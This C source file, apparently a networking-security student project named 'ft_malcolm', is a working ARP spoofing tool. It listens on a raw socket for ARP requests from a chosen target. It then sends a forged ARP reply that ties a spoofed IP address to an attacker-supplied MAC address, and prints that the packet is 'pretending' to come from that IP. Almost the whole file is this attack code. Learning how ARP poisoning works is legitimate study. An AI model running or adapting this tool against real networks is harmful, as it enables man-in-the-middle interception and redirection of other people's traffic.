#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ether.h>
#include <linux/if_packet.h>
#include <linux/if_arp.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include "ft_malcolm.h"

void print_arp_packet(const unsigned char *buf) {
	const struct ether_header *eth = (const struct ether_header *)buf;
	const struct arp_packet *arp = (const struct arp_packet *)(buf + sizeof(struct ether_header));

	printf("\n--- ETHERNET HEADER ---\n");
	printf("Destination MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
		   eth->ether_dhost[0], eth->ether_dhost[1], eth->ether_dhost[2],
		   eth->ether_dhost[3], eth->ether_dhost[4], eth->ether_dhost[5]);
	printf("Source MAC:	  %02x:%02x:%02x:%02x:%02x:%02x\n",
		   eth->ether_shost[0], eth->ether_shost[1], eth->ether_shost[2],
		   eth->ether_shost[3], eth->ether_shost[4], eth->ether_shost[5]);
	printf("EtherType:	   0x%04x\n", ntohs(eth->ether_type));

	printf("\n--- ARP HEADER ---\n");
	printf("Hardware type:   %u\n", ntohs(arp->hdr.ar_hrd));
	printf("Protocol type:   0x%04x\n", ntohs(arp->hdr.ar_pro));
	printf("HW size:		 %u\n", arp->hdr.ar_hln);
	printf("Proto size:	  %u\n", arp->hdr.ar_pln);
	printf("Opcode:		  %u (%s)\n",
		   ntohs(arp->hdr.ar_op),
		   ntohs(arp->hdr.ar_op) == 1 ? "request" :
		   (ntohs(arp->hdr.ar_op) == 2 ? "reply" : "other"));

	printf("Sender MAC:	  %02x:%02x:%02x:%02x:%02x:%02x\n",
		   arp->sender_mac[0], arp->sender_mac[1], arp->sender_mac[2],
		   arp->sender_mac[3], arp->sender_mac[4], arp->sender_mac[5]);
	printf("Sender IP:	   %u.%u.%u.%u\n",
		   arp->sender_ip[0], arp->sender_ip[1],
		   arp->sender_ip[2], arp->sender_ip[3]);
	printf("Target MAC:	  %02x:%02x:%02x:%02x:%02x:%02x\n",
		   arp->target_mac[0], arp->target_mac[1], arp->target_mac[2],
		   arp->target_mac[3], arp->target_mac[4], arp->target_mac[5]);
	printf("Target IP:	   %u.%u.%u.%u\n",
		   arp->target_ip[0], arp->target_ip[1],
		   arp->target_ip[2], arp->target_ip[3]);

	printf("------------------------\n\n");
}

static int parse_mac(const char *s, unsigned char *out) {
	unsigned char vals[6];
	if (sscanf(s, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
			&vals[0], &vals[1], &vals[2],
			&vals[3], &vals[4], &vals[5]) != 6) return -1;
	for (int i = 0; i < 6; i++) out[i] = (unsigned char)vals[i];
	return 0;
}

void send_arp_packet(int sock, const char *iface,
					 const char *source_ip, const char *source_mac, const char *target_ip, const char *target_mac) {
	struct ifreq ifr;
	struct sockaddr_ll socket_address;
	unsigned char *buf;
	struct ether_header *eth;
	struct arp_packet *arp;
	int len;

	// --- Get interface index ---
	ft_memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1); //change
	if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
		perror("ioctl(SIOCGIFINDEX)");
		exit(EXIT_FAILURE);
	}
	int ifindex = ifr.ifr_ifindex;

	// --- Get interface MAC address ---
	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
		perror("ioctl(SIOCGIFHWADDR)");
		exit(EXIT_FAILURE);
	}
	//unsigned char *src_mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;

	// --- Allocate and build packet ---
	buf = malloc(BUF_SIZE);
	if (!buf) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	eth = (struct ether_header *)buf;
	arp = (struct arp_packet *)(buf + sizeof(struct ether_header));

	unsigned char source_mac_conv[6];
	unsigned char target_mac_conv[6];
	
	if (parse_mac(source_mac, source_mac_conv) == -1) {
		fprintf(stderr, "Invalid MAC format: %s\n", source_mac);
		exit(EXIT_FAILURE);
	}

	if (parse_mac(target_mac, target_mac_conv) == -1) {
		fprintf(stderr, "Invalid MAC format: %s\n", target_mac);
		exit(EXIT_FAILURE);
	}
	// Ethernet header
	ft_memcpy(eth->ether_dhost, target_mac_conv, ETH_ALEN);
	ft_memcpy(eth->ether_shost, source_mac_conv, ETH_ALEN);
	eth->ether_type = htons(ETH_P_ARP);

	// ARP header
	arp->hdr.ar_hrd = htons(ARPHRD_ETHER);
	arp->hdr.ar_pro = htons(ETH_P_IP);
	arp->hdr.ar_hln = ETH_ALEN;
	arp->hdr.ar_pln = 4;
	arp->hdr.ar_op  = htons(ARPOP_REPLY);

	// IPs
	struct in_addr src_ip, dst_ip;
	inet_aton(source_ip, &src_ip);
	inet_aton(target_ip, &dst_ip);

	// Fill ARP payload
	ft_memcpy(arp->sender_mac, source_mac_conv, ETH_ALEN);
	ft_memcpy(arp->sender_ip, &src_ip.s_addr, 4);
	ft_memcpy(arp->target_mac, target_mac_conv, ETH_ALEN);
	ft_memcpy(arp->target_ip, &dst_ip.s_addr, 4);

	len = sizeof(struct ether_header) + sizeof(struct arp_packet);

	// --- Socket address setup ---
	ft_memset(&socket_address, 0, sizeof(socket_address));
	socket_address.sll_ifindex = ifindex;
	socket_address.sll_halen = ETH_ALEN;
	socket_address.sll_family = AF_PACKET;
	ft_memset(socket_address.sll_addr, 0xff, ETH_ALEN); // broadcast

	// Packet ready
	print_arp_packet(buf);

	if (sendto(sock, buf, len, 0,
			   (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
		perror("sendto");
		free(buf);
		exit(EXIT_FAILURE);
	}

	printf("[+] ARP packet sent pretending that IP %s has MAC %s\n", source_ip, source_mac);
	free(buf);
}

int main(int argc, char **argv) {
	const char *source_ip;  //the ip we want to spoof
	const char *source_mac; //mac address that will show on the spoofed packet

	const char *target_ip;  //ip addr  of the machine that will send the ARP request
	const char *target_mac; //mac addr of the machine that will send the ARP request

	if (argc != 5) {
		fprintf(stderr, "Usage: %s <source_ip> <source_mac> <target_ip> <target_mac>\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	source_ip = argv[1];
	source_mac = argv[2];
	target_ip = argv[3];
	target_mac = argv[4];

	int sock;
	unsigned char buffer[BUF_SIZE];
	struct sockaddr_ll addr;
	socklen_t addr_len = sizeof(addr);

	// Create raw socket to listen for ARP
	sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
	if (sock < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	printf("Listening for ARP packets...\n");

	while (1) {
		ssize_t n = recvfrom(sock, buffer, sizeof(buffer), 0,
							 (struct sockaddr *)&addr, &addr_len);
		if (n < 0) {
			perror("recvfrom");
			close(sock);
			exit(EXIT_FAILURE);
		}

		// Skip Ethernet header
		struct ether_header *eth = (struct ether_header *)buffer;
		if (ntohs(eth->ether_type) != ETH_P_ARP)
			continue; // ignore non-ARP packets

		struct arp_packet *arp = (struct arp_packet *)(buffer + sizeof(struct ether_header));

		char src_ip[INET_ADDRSTRLEN];
		char dst_ip[INET_ADDRSTRLEN];

		inet_ntop(AF_INET, arp->sender_ip, src_ip, sizeof(src_ip));
		inet_ntop(AF_INET, arp->target_ip, dst_ip, sizeof(dst_ip));

		/* printf("\n=== ARP Packet ===\n");
		printf("Operation : %s\n", ntohs(arp->hdr.ar_op) == ARPOP_REQUEST ? "Request" : "Reply");
		printf("Source IP : %s\n", src_ip);
		printf("Source MAC: %s\n", ether_ntoa((struct ether_addr *)arp->sender_mac));
		printf("Target IP : %s\n", dst_ip);
		printf("Target MAC: %s\n", ether_ntoa((struct ether_addr *)arp->target_mac)); */

		if (!ft_strncmp(ether_ntoa((struct ether_addr *)arp->sender_mac), target_mac, ft_strlen(target_mac))
				&& !ft_strncmp(src_ip, target_ip, ft_strlen(target_ip))
				&& !ft_strncmp(dst_ip, source_ip, ft_strlen(source_ip))) {
			printf("\n=== ARP Packet ===\n");
			printf("Operation : %s\n", ntohs(arp->hdr.ar_op) == ARPOP_REQUEST ? "Request" : "Reply");
			printf("Source IP : %s\n", src_ip);
			printf("Source MAC: %s\n", ether_ntoa((struct ether_addr *)arp->sender_mac));
			printf("Target IP : %s\n", dst_ip);
			printf("Target MAC: %s\n", ether_ntoa((struct ether_addr *)arp->target_mac));
			printf("===This one wants mango!===\n");

			printf("Building ARP packet...\n");
			send_arp_packet(sock, "enp10s0", source_ip, source_mac, target_ip, target_mac);
			printf("ARP packet sent!\n");
			exit(EXIT_SUCCESS);
		}
	}

	close(sock);
	return 0;
}
